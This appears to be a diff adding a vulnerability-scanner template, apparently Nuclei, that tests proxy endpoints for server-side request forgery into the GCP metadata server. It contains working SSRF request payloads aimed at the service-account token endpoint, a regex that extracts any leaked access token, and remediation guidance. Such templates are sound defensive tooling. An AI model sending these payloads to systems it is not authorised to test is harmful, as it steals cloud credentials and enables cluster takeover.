@@ -1,0 +1,63 @@
+id: flanksource-gcp-metadata-ssrf
+
+info:
+  name: Flanksource - GCP Metadata SSRF
+  author: flanksource
+  severity: critical
+  description: |
+    Probes hosts that proxy or fetch user-supplied URLs (Caddy telemetry proxy,
+    webflow-proxy, mission-control playbooks with http actions) for SSRF that reaches
+    the GKE node metadata server. Reaching v1/instance/service-accounts leaks the
+    node service-account token — game over for that cluster.
+  remediation: |
+    Enable GKE Workload Identity and set the node metadata mode to GKE_METADATA so
+    the legacy metadata endpoints are blocked; validate/allowlist outbound URLs in
+    any proxy or playbook http action.
+  reference:
+    - https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity
+    - https://cloud.google.com/compute/docs/metadata/overview
+  classification:
+    cwe-id: CWE-918
+  metadata:
+    max-request: 3
+  tags: flanksource,cloud,gcp,ssrf,metadata
+
+http:
+  - raw:
+      - |
+        GET /?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
+        Host: {{Hostname}}
+        Metadata-Flavor: Google
+      - |
+        GET /proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
+        Host: {{Hostname}}
+        Metadata-Flavor: Google
+      - |
+        GET /?target=http://169.254.169.254/computeMetadata/v1/project/project-id HTTP/1.1
+        Host: {{Hostname}}
+        Metadata-Flavor: Google
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: service-account-token
+        part: body
+        words:
+          - '"access_token"'
+          - '"token_type"'
+        condition: and
+
+      - type: dsl
+        name: project-metadata
+        dsl:
+          - "contains(body, 'computeMetadata') || contains(body, 'numeric_project_id') || regex('^[a-z][a-z0-9-]{5,29}$', trim(body))"
+          - 'status_code == 200'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"access_token"[ ]*:[ ]*"[^"]+"'
